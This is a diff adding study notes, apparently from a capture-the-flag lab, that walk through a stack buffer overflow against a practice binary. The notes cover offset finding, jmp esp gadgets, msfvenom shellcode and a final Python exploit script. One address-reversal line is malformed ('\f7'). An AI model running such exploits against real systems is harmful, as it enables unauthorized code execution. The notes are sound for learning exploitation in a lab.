@@ -1893,7 +1893,7 @@ print(buffer)
       		- "show env" will show us env variables and we will unset ALL values using "unset env {VARIABLE}"
 
  		GET EIP ON TARGET MACHINE
-	 	- NORMAL GDB ASSEMBLY LOCATIONS inside (gdb) "run" to see memory location
+	 	- NORMAL GDB ASSEMBLY LOCATIONS inside (gdb) "run" to see memory location and break it
     		- NORMAL GDB run "info proc map" and COPY the START of next memory address down from the [HEAP] and the END of [STACK] Line
        		- PASTE noth  into your python script as "find /b {address1}, {address2}, 0xff, 0xe4" COPY THIS AND PASTE IN NORMAL GDB
 	  	- PASTE INTO NORMAL GDB "find /b 0xf7de1000, 0xffffe000, 0xff, 0xe4" and grab the FIRST 4 addresses as these are the first jump esp locations
@@ -1961,7 +1961,124 @@ student
 
 
 
+## ELF Exploitation (FLAG)
+Download and transfer to LinOPs
+scp inventory.exe student@10.50.37.42:.
+
+Copy from linops to windows 
+scp student@10.50.37.42:/home/student/inventory.exe c:\Users\student\Desktop
+
+Useful GDB commands:
+info registers
+info proc map
+find
+run
+break *0x00000000
+continue 
+
+View in GHIDRA the STRINGS
+```
+undefined4 getTheGoods(void)
+
+{
+  char local_4c [68];
+  
+  printf("Press enter to view inventory: ");
+  fgets(local_4c,0x200,stdin);
+  puts(
+      "Total Inventory:\nBandages: 12\nKvass: 1.000\nTurnips: 12.000\n5.45x39: 20.000\nAK-74M: 200\n Zastava Koral: 50"
+      );
+  usleep(5000);
+  return 0;
+
+```
+
+Run Normally to see output
+
+Run GDB ./inventory.exe to start GDB on the executable 
+
+Run pdisass getTheGoods
+
+Create your py buffer overflow script
+```
+#!/usr/bin/env python
+buffer = "A" * 60
+
+print(buffer)
+
+```
 
 
+Run in GDB using the Random WIREMASK to Find OFFSET
+COPY EIP and enter into WIREMASK
+76 is the OFFSET so now modify the bufferoverflow.py 
+
+```
+#!/usr/bin/env python
+
+buffer = "A" * 76
 
 
+```
+
+Now find jump locations using NORMAL GDB
+```
+env - gdb inventory.exe
+unset env LINES
+unset env COLUMNS
+run
+Inventory: {MAKE IT ERROR}
+```
+
+
+Once it ERRORs Copy the start of the next location after HEAP and the end of the STACK and use the find command
+```
+0xf7de1000
+0xffffe000
+"find /b {address1}, {address2}, 0xff, 0xe4"
+```
+
+
+Once the find comes back copy the first four addresses. Split them and reverse them
+```
+0xf7de3b59 --> 0xf7 de 3b 59 --> \x59\x3b\xde\f7
+0xf7f588ab --> 0xf7 f5 88 ab --> \xab\x88\xf5\xf7
+0xf7f645fb
+0xf7f6460f
+
+
+```
+
+NEXT Generate SHELL CODE
+```
+msfvenom -p linux/x86/exec CMD=whoami -b '\x00' -f python
+COPY SHELL CODE TO SCRIPT
+
+-MSFCONSOLE 
+       				- msfdb init
+	   			- msfconsole
+       				- use payload/linux/x86/exec
+	   			- show options
+       				- set CMD whoami
+	   			- generate -b '\x00' -f python
+```
+
+SCRIPT place shellcode into script with NOP and EIG values pulled from JMP locations
+```
+#!/usr/bin/env python
+
+buffer = "A" * 76
+eip = "\x59\x3b\xde\f7"
+nop = "\x90" * 15
+buf =  b""
+buf += b"\xdb\xca\xd9\x74\x24\xf4\x5a\xb8\x72\xe8\x99\x97"
+buf += b"\x29\xc9\xb1\x0b\x31\x42\x19\x03\x42\x19\x83\xea"
+buf += b"\xfc\x90\x1d\xf3\x9c\x0c\x47\x56\xc5\xc4\x5a\x34"
+buf += b"\x80\xf3\xcd\x95\xe1\x93\x0d\x82\x2a\x01\x67\x3c"
+buf += b"\xbc\x26\x25\x28\xb9\xa8\xca\xa8\xb1\xc0\xa5\xc9"
+buf += b"\x50\x79\x3a\x5d\xf8\xf0\xdb\xac\x7e"
+
+print(buffer+eip+nop+buf)
+```
+
+Now RUN inventory.exe
